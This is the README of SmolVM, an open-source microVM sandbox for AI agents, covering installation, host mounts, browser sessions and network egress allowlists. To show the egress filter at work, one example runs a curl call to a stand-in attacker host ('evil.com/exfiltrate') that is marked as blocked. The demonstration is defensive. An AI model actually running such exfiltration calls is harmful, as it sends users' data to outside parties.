---
title: "Show HN: SmolVM – open-source sandbox for coding and computer-use agents"
source: Hacker News
url: https://github.com/CelestoAI/SmolVM
date: 2026-04-10
published_at: 2026-04-10T00:01:00+00:00
tag: 工具开源
item_id: 5db3338659909453
---
![](https://camo.githubusercontent.com/3e78bf2e9674974b78db2803102ac52cee129c574434b0492f5f2b538bdfa335/68747470733a2f2f696b2e696d6167656b69742e696f2f6772616473666c6f772f63656c6573746f61692f6c6f676f2f63656c6573746f253230636f7665722532306c6f775f764669676252614a492e706e67)


[Quick start](https://github.com#quickstart) • [Examples](https://github.com#examples) • [Features](https://github.com#features) • [Performance](https://github.com#performance) • [Docs](https://docs.celesto.ai) • [Community Slack](https://join.slack.com/t/celestoai/shared_invite/zt-3qc7h8gno-Nb5_PElEWHDNnGqdVzC~4Q)

SmolVM gives AI agents their own disposable computer. Each microVM boots in milliseconds, runs any code or software you throw at it, keeps state when you need it, and vanishes when you don't — nothing touches your host.

**Sub-second boot**— VMs ready in ~500 ms.**Hardware isolation**— Stronger security than containers.**Network controls**— Domain allowlists for egress filtering.**Browser sessions**— Full browser agents can see and control.**Host mounts**— Give sandboxes read access to local directories.**Snapshots**— Save and restore VM state instantly.**Coding agents**— Start enviornment with a pre-installed coding agent.**OpenClaw**— GUI Linux apps inside a sandbox.

**Run untrusted code safely.**Execute AI-generated code in an isolated sandbox instead of on your machine.**Give agents a browser.**Spin up a full browser session that agents can see and control in real time.**Let agents read your project.**Mount a local directory so agents can explore your codebase inside a sandbox.**Keep state across turns.**Reuse the same sandbox throughout a multi-step workflow.

Install SmolVM with a single command:

`curl -sSL https://celesto.ai/install.sh | bash`

This installs everything you need (including Python), configures your machine, and verifies the setup.

## Manual installation

```
pip install smolvm
smolvm setup
smolvm doctor
```

On supported Linux and macOS systems, `pip install smolvm`

also pulls in the matching `smolvm-core`

wheel automatically. Most users do not need Rust installed.

Linux may prompt for `sudo`

during setup so it can install host dependencies and configure runtime permissions.

For golden-AMI builds, two-stage deploys, pinning the Firecracker version, and other non-default install paths, see [docs/installation.md](https://github.com/CelestoAI/SmolVM/blob/main/docs/installation.md).

```
from smolvm import SmolVM
vm = SmolVM()
result = vm.run("echo 'Hello from the sandbox!'")
print(result)
vm.stop()
```

Create a sandbox, check that it's running, then stop it:

```
smolvm create --name my-sandbox
# my-sandbox running 172.16.0.2
smolvm list
# NAME STATUS IP
# my-sandbox running 172.16.0.2
smolvm stop my-sandbox
```

Open a shell inside a running sandbox:

`smolvm ssh my-sandbox`

It sucks to “press enter and accept changes” every few seconds while using coding agents. SmolVM makes it easy to isolate the agent coding environment from the host (laptops).

With a single command you get a claude/codex pre-installed sandbox ready with git credential to make you build a billion dollar business without making any mistake ;)

```
smolvm codex start # start a new environment with codex preinstalled
smolvm claude start # start a new environment with codex preinstalled
```

SmolVM can also start a full browser inside a sandbox. This is useful when agents need to navigate websites, fill out forms, or take screenshots.

Start a browser session with a live view you can watch in your own browser:

```
smolvm browser start --live
# Session: sess_a1b2c3
# Live view: http://localhost:6080
```

Open the URL to watch the browser in real time. When you're done, list and stop sessions:

```
smolvm browser list
smolvm browser stop sess_a1b2c3
```

See [examples/browser_session.py](https://github.com/CelestoAI/SmolVM/blob/main/examples/browser_session.py) for the Python equivalent.

By default, sandboxes have full internet access. You can restrict which domains a sandbox can reach by passing `internet_settings`

:

```
from smolvm import SmolVM
vm = SmolVM(internet_settings={
"allowed_domains": ["https://api.openai.com"],
})
vm.run("curl https://api.openai.com/v1/models") # allowed
vm.run("curl https://evil.com/exfiltrate") # blocked
```

See [docs/concepts/network-egress-controls.md](https://github.com/CelestoAI/SmolVM/blob/main/docs/deep-dive/network-egress-controls.md) for how it works under the hood.

You can give a sandbox read access to a folder on your machine. This is useful when an agent needs to work with an existing project without copying files back and forth.

```
smolvm create --mount ~/Projects/my-app
smolvm ssh my-sandbox
ls /workspace # your host files appear here
```

The host folder is read-only — the sandbox can read every file, but changes stay inside the sandbox and never touch the originals. If the agent creates or edits files under `/workspace`

, those changes live only in the VM's overlay layer.

Mount at a custom path, or mount multiple directories:

`smolvm create --mount ~/Projects/my-app:/code --mount ~/data:/mnt/data`

The same works from Python:

```
from smolvm import SmolVM
with SmolVM(mounts=["~/Projects/my-app"]) as vm:
result = vm.run("ls /workspace")
print(result.stdout)
```


Note:This feature is read-only for now. Any changes you make inside the sandbox do not travel back to the host. Write-back support is planned for a future release.

| What you'll learn | Example |
|---|---|
| Run code in a sandbox |
|

[browser_session.py](https://github.com/CelestoAI/SmolVM/blob/main/examples/browser_session.py)[env_injection.py](https://github.com/CelestoAI/SmolVM/blob/main/examples/env_injection.py)These examples show how to wrap SmolVM as a tool for popular agent frameworks, so an AI model can run shell commands or drive a browser through your sandbox.

| Framework | Example |
|---|---|
| OpenAI Agents |
|

[langchain_tool.py](https://github.com/CelestoAI/SmolVM/blob/main/examples/agent_tools/langchain_tool.py)[pydanticai_tool.py](https://github.com/CelestoAI/SmolVM/blob/main/examples/agent_tools/pydanticai_tool.py)[pydanticai_reusable_tool.py](https://github.com/CelestoAI/SmolVM/blob/main/examples/agent_tools/pydanticai_reusable_tool.py)[pydanticai_agent_browser.py](https://github.com/CelestoAI/SmolVM/blob/main/examples/agent_tools/pydanticai_agent_browser.py)[computer_use_browser.py](https://github.com/CelestoAI/SmolVM/blob/main/examples/agent_tools/computer_use_browser.py)| What it does | Example |
|---|---|
| Install and run OpenClaw inside a Debian sandbox with a 4 GB root filesystem |
|

Each script shows its own `pip install ...`

line when it needs extra packages.

SmolVM automatically trusts new sandboxes on first connection to keep setup simple. This is safe for local development, but you should not expose sandbox network ports publicly without extra controls. See [SECURITY.md](https://github.com/CelestoAI/SmolVM/blob/main/SECURITY.md) for the full policy and scope.

SmolVM ships a benchmark suite that measures the timings AI agents actually feel: cold start, time-to-interactive, pause/resume, and snapshot create/restore. It drives the public Python SDK on whichever backend is native to your host — Firecracker on Linux, QEMU on macOS.

Run it locally:

`uv run python scripts/benchmarks/bench.py`

See [scripts/benchmarks/README.md](https://github.com/CelestoAI/SmolVM/blob/main/scripts/benchmarks/README.md) for flags, output format, and what each metric means.

See [CONTRIBUTING.md](https://github.com/CelestoAI/SmolVM/blob/main/CONTRIBUTING.md) to get started.

Apache 2.0 — see [LICENSE](https://github.com/CelestoAI/SmolVM/blob/main/LICENSE) for details.

[Celesto AI](https://celesto.ai)
